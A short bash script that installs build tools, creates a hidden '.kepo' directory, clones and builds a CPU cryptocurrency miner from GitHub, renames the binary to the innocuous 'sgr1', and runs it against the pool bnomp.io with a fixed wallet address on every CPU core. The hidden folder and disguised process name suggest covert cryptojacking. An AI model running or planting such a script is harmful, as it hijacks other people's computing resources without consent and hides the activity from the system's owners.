#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl
mkdir .kepo && cd .kepo
git clone https://github.com/bitnet-io/cpuminer-opt-aurum
cd cpuminer-opt-aurum
./build.sh
mv cpuminer sgr1
./sgr1 -a aurum -o stratum+tcp://bnomp.io:3333 -u bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.envio -p x -t $(nproc --all)